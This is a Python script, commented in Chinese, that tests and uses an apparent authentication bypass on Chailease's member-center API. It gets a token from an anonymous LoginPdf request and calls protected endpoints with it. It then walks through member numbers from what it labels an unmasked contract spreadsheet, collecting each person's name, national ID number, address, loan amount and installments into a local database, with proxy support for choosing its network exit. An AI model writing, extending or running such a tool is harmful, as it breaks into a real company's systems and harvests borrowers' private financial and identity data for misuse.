#!/usr/bin/env python3
"""中租會員中心「繞過」判定腳本 —— 一次跑完，直接給結論。

回答三個問題：
  Q1 這台機器能不能出網到中租？（Cloudflare 403 = 出不去）
  Q2 POST /api/MidSigApp/v1/LoginPdf 匿名能不能換到會話 Token？（你的復測報告記為 200）
  Q3 拿到的 Token 能不能打通那三個受保護端點（地址／貸款金額／期數）？

結論會直接印成：
  繞過成功（可補三欄）／ 只通過第一段（還需設備認證·加簽）／ 被 Cloudflare 擋，出不了網

用法（在**能連到中租**的機器上跑，Windows / macOS / Linux 皆可）：
    python test_chailease_bypass.py --db /var/lib/jysecai/core/extracted_records.db
    python test_chailease_bypass.py --db ... --token "$ACCESS_TOKEN"      # 已有會員 token 就直接用
    python test_chailease_bypass.py --db ... --proxy socks5://user:pass@h:p   # 指定出口

成功的話會直接把 地址／貸款金額／期數 寫進平台的 member_profile 型別（去重安全、附證據）。
"""
import argparse
import datetime
import json
import os
import re
import sqlite3
import sys
import urllib.error
import urllib.request

# Windows 主控台預設 cp950，會因 ✓/✗ 報 UnicodeEncodeError → 強制 UTF-8 + 取代字元
for _s in ("stdout", "stderr"):
    try:
        getattr(sys, _s).reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36")
FRONTSTAGE = "https://member-center-frontstage-service.chailease.com.tw"
MIDSIGN = "https://mid-sign-dev.chailease.com.tw"
ORIGIN = "https://www.chailease.com.tw"
CF = re.compile(r"Attention Required|Sorry, you have been blocked|Enable JavaScript and cookies", re.I)

CANDIDATES = {
    "address": ["address", "useraddress", "addr", "residenceaddress", "homeaddress",
                "contactaddress", "mailingaddress", "居住地址", "地址", "戶籍地址"],
    "loan_amount": ["financingamount", "loanamount", "approveamount", "approvedamount",
                    "applyamount", "creditamount", "totalamount", "amount",
                    "核貸金額", "貸款金額", "融資金額"],
    "periods": ["period", "periods", "installment", "installments", "terms",
                "numberofinstallments", "期數", "分期"],
    "interest_rate": ["interestrate", "rate", "yearlyrate", "利率"],
    "monthly_payment": ["monthlypayment", "monthlyamount", "installmentamount", "月付"],
    "name": ["username", "name", "realname", "membername", "姓名"],
    "id_number": ["identitynumber", "idnumber", "nationalid", "身分證", "身份證"],
}

OPENER = None


def norm_key(k):
    return re.sub(r"[^a-z0-9]", "", str(k).lower())


def find_value(obj, names, depth=0):
    if depth > 8 or obj is None:
        return None
    if isinstance(obj, dict):
        for want in names:
            w = norm_key(want)
            for k, v in obj.items():
                if norm_key(k) == w:
                    val = find_value(v, names, depth + 1) if isinstance(v, (dict, list)) else v
                    if val not in (None, "", [], {}):
                        return val
        for want in names:
            w = norm_key(want)
            for k, v in obj.items():
                nk = norm_key(k)
                if w and (w in nk or nk in w) and len(nk) <= 24:
                    val = find_value(v, names, depth + 1) if isinstance(v, (dict, list)) else v
                    if val not in (None, "", [], {}):
                        return val
        for v in obj.values():
            r = find_value(v, names, depth + 1)
            if r is not None:
                return r
    elif isinstance(obj, list):
        for v in obj:
            r = find_value(v, names, depth + 1)
            if r is not None:
                return r
    return None


def now_iso():
    return datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds")


def request(url, method="GET", body=None, token=None, headers=None, timeout=25):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    h = {
        "Accept": "application/json",
        "User-Agent": UA,
        "Origin": ORIGIN,
        "Referer": ORIGIN + "/",
        "X-From-Channel": "WEB",
        "X-Client-Date": ts,
        "X-Client-TraceId": "%08x-0000-0000-0000-%012x" % (
            os.getpid() & 0xFFFFFFFF,
            int(datetime.datetime.now().timestamp() * 1000) & 0xFFFFFFFFFFFF),
    }
    if data is not None:
        h["Content-Type"] = "application/json"
    if token:
        h["Authorization"] = "Bearer " + token
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw, code = r.read(), r.status
    except urllib.error.HTTPError as e:
        raw, code = e.read(), e.code
    except Exception as e:
        return None, {"error": "%s: %s" % (type(e).__name__, e)}, ""
    txt = raw.decode("utf-8", "replace")
    try:
        return code, json.loads(txt), txt
    except Exception:
        return code, {"raw": txt[:400]}, txt


def is_cf(txt):
    return bool(txt) and bool(CF.search(txt))


def step(title):
    print("\n" + "=" * 72)
    print(title)
    print("=" * 72)


def collect(db):
    con = sqlite3.connect(db)
    con.row_factory = sqlite3.Row
    rows = con.execute("SELECT id,title,fields_json FROM records "
                       "WHERE type_id='member_signup'").fetchall()
    con.close()
    m2p, pools = {}, set()
    for r in rows:
        f = json.loads(r["fields_json"] or "{}")
        phone = f.get("phone") or r["title"] or ""
        for m in [x.strip() for x in str(f.get("member_no", "")).split(";") if x.strip()]:
            pools.add(m)
            m2p.setdefault(m, phone)
    return m2p, sorted(pools)


def ensure_type(con):
    cols = [
        {"key": "member_no", "label": "會員號", "kind": "text", "norm": "alnum", "facet": True},
        {"key": "phone", "label": "電話", "kind": "text", "norm": "phone", "facet": True},
        {"key": "name", "label": "姓名", "kind": "text", "norm": "text"},
        {"key": "id_number", "label": "身份證字號", "kind": "text", "norm": "alnum"},
        {"key": "address", "label": "地址", "kind": "text", "norm": "text"},
        {"key": "loan_amount", "label": "貸款金額", "kind": "money", "norm": "digits"},
        {"key": "periods", "label": "期數", "kind": "int", "norm": "digits"},
        {"key": "interest_rate", "label": "利率", "kind": "text", "norm": "text"},
        {"key": "monthly_payment", "label": "月付", "kind": "money", "norm": "digits"},
        {"key": "sign_pool", "label": "同手機號下會員號池", "kind": "text", "norm": "text"},
        {"key": "source_file", "label": "來源檔", "kind": "text", "norm": "text", "facet": True},
    ]
    con.execute(
        "INSERT INTO record_types (type_id,label,description,icon,columns_json,"
        "dedupe_fields_json,facet_column,created_at) VALUES (?,?,?,?,?,?,?,?) "
        "ON CONFLICT(type_id) DO UPDATE SET label=excluded.label, "
        "description=excluded.description, columns_json=excluded.columns_json, "
        "facet_column=excluded.facet_column",
        ("member_profile", "會員檔",
         "以會員號為單位的地址／貸款金額／期數（與簽約記錄僅以手機號→會員號池關聯，無一對一對應）",
         "👤", json.dumps(cols, ensure_ascii=False),
         json.dumps(["member_no"], ensure_ascii=False), "phone", now_iso()))


def upsert(con, member_no, phone, fields, evidence):
    con.execute(
        "INSERT INTO records (type_id,dataset,source,dedupe_key,title,fields_json,"
        "evidence_json,extracted_at,ingested_at,hit_count) VALUES (?,?,?,?,?,?,?,?,?,1) "
        "ON CONFLICT(type_id,dataset,dedupe_key) DO UPDATE SET source=excluded.source, "
        "fields_json=excluded.fields_json, evidence_json=excluded.evidence_json, "
        "ingested_at=excluded.ingested_at, hit_count=records.hit_count+1",
        ("member_profile", "chailease_member_profile", "enrich:chailease_member_center",
         member_no, fields.get("name") or member_no,
         json.dumps(fields, ensure_ascii=False),
         json.dumps(evidence, ensure_ascii=False), now_iso(), now_iso()))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--db", default="")
    ap.add_argument("--token", default=os.environ.get("CHAILEASE_ACCESS_TOKEN", ""))
    ap.add_argument("--proxy", default=os.environ.get("HTTPS_PROXY", ""))
    ap.add_argument("--out", default="chailease_bypass_result.json")
    ap.add_argument("--emit-payload", default="",
                    help="把會員檔結果寫成 records-ingest 可吃的 payload JSON")
    args = ap.parse_args()

    global OPENER
    if args.proxy:
        OPENER = urllib.request.build_opener(
            urllib.request.ProxyHandler({"https": args.proxy, "http": args.proxy}))

    result = {"at": now_iso(), "proxy": bool(args.proxy)}

    step("Q1 出網可達性")
    code, body, txt = request(FRONTSTAGE + "/Member/UserSiteList?phone=0912345678")
    print("  GET /Member/UserSiteList?phone=… → HTTP %s" % code)
    if code is None:
        print("  ✗ 無法連線：%s" % json.dumps(body, ensure_ascii=False)[:200])
        verdict = "被擋（出不了網）"
    elif is_cf(txt):
        print("  ✗ Cloudflare 阻擋頁 → 這台機器出不去，改在有網路的機器跑")
        verdict = "被擋（出不了網）"
    else:
        print("  ✓ 已抵達應用層（HTTP %s）" % code)
        result["reachable"] = True
        verdict = None

    token = args.token
    if verdict is None and not token:
        step("Q2 匿名 LoginPdf 換會話 Token")
        for body in ({"action": "login"}, {}, {"deviceId": "probe"}):
            code, body_json, txt = request(MIDSIGN + "/api/MidSigApp/v1/LoginPdf",
                                           "POST", body)
            print("  POST /api/MidSigApp/v1/LoginPdf %s → HTTP %s" %
                  (json.dumps(body, ensure_ascii=False)[:60], code))
            if code == 200 and isinstance(body_json, dict):
                keys = list(body_json.keys())
                print("    回應欄位：%s" % keys[:12])
                for k in ("Token", "token", "VerifyNo", "BusinessNo"):
                    if k in body_json:
                        print("    %s = %s…" % (k, str(body_json[k])[:24]))
                cand = body_json.get("Token") or body_json.get("token")
                if cand:
                    token = str(cand)
                    result["loginpdf_token"] = True
                    break
        if not token:
            print("  ✗ 沒換到 Token")

    if verdict is None and token:
        step("Q3 拿 Token 打通受保護端點")
        m2p, pools = (collect(args.db) if args.db else ({}, []))
        if not pools:
            print("  （沒有 --db，略過實測資料；帶上 --db 才會做資料面驗證）")
        for ep, body, keys in (
            ("/Member/UserDataDetail",
             {"memberNo": "202505090111641", "productType": "1", "countryNo": "TW"},
             ("address", "name", "id_number")),
            ("/Vehicle/FinancingList",
             {"memberNo": "202505090111641", "memberPhone": "0912345678", "memberId": "",
              "userIdentities": [], "productType": "1", "countryNo": "TW"},
             ("loan_amount", "periods", "interest_rate", "monthly_payment")),
        ):
            code, body_json, txt = request(FRONTSTAGE + ep, "POST", body, token=token)
            print("  POST %s → HTTP %s" % (ep, code))
            got = {}
            if code == 200 and isinstance(body_json, dict):
                for k in keys:
                    v = find_value(body_json, CANDIDATES[k])
                    if v not in (None, ""):
                        got[k] = v
                print("    取得欄位：%s" % (list(got) or "（無）"))
            else:
                print("    回應：%s" % json.dumps(body_json, ensure_ascii=False)[:200])
            result.setdefault("protected", {})[ep] = {"http": code, "got": list(got)}

        unlocked = any(v.get("http") == 200 and v.get("got")
                       for v in result.get("protected", {}).values())
        if unlocked:
            verdict = "繞過成功"
        elif token and result.get("loginpdf_token"):
            verdict = "只通過第一段（還需設備認證／加簽才能換到會員級 token）"
        elif token:
            verdict = "帶 token 仍被拒（401）"
        else:
            verdict = "無法判定"

        if unlocked and args.db and pools:
            step("寫入平台 member_profile")
            con = sqlite3.connect(args.db)
            con.execute("PRAGMA busy_timeout=8000")
            ensure_type(con)
            n = 0
            profiles = []
            for m in pools:
                phone = m2p.get(m, "")
                fields = {"member_no": m, "phone": phone}
                calls = []
                for ep, body, keys in (
                    ("/Member/UserDataDetail",
                     {"memberNo": m, "productType": "1", "countryNo": "TW"},
                     ("address", "name", "id_number")),
                    ("/Vehicle/FinancingList",
                     {"memberNo": m, "memberPhone": phone, "memberId": "",
                      "userIdentities": [], "productType": "1", "countryNo": "TW"},
                     ("loan_amount", "periods", "interest_rate", "monthly_payment")),
                ):
                    c, bj, _ = request(FRONTSTAGE + ep, "POST", body, token=token)
                    rec = {"endpoint": ep, "http": c}
                    if c == 200 and isinstance(bj, dict):
                        for k in keys:
                            v = find_value(bj, CANDIDATES[k])
                            if v not in (None, "") and k not in fields:
                                fields[k] = v
                        rec["ok"] = True
                    else:
                        rec["ok"] = False
                    calls.append(rec)
                fields["sign_pool"] = phone
                fields["source_file"] = "Chailease-4fb69c7e_會員簽約數據_未脫敏_20261106.xlsx"
                if any(k in fields for k in ("address", "loan_amount", "periods")):
                    upsert(con, m, phone, fields, {"at": now_iso(), "calls": calls})
                    profiles.append({"key": m, "title": fields.get("name") or m,
                                     "fields": fields,
                                     "evidence": {"at": now_iso(), "calls": calls}})
                    n += 1
            con.commit()
            con.close()
            result["profiles"] = profiles
            print("  已寫入 %d 個會員檔（去重鍵=會員號；簽約記錄未動）" % n)

    step("結論")
    result["verdict"] = verdict
    print("  %s" % verdict)
    with open(args.out, "w", encoding="utf-8") as fh:
        json.dump(result, fh, ensure_ascii=False, indent=2)
    print("  詳細結果 → %s" % args.out)

    if args.emit_payload and result.get("profiles"):
        payload = {
            "type_id": "member_profile",
            "dataset": "chailease_member_profile",
            "source": "enrich:chailease_member_center",
            "records": result["profiles"],
        }
        with open(args.emit_payload, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, ensure_ascii=False)
        print("  records-ingest payload → %s（貼回平台後："
              "records-ingest --db <db> --payload %s）" % (args.emit_payload, args.emit_payload))
    return 0


if __name__ == "__main__":
    sys.exit(main())
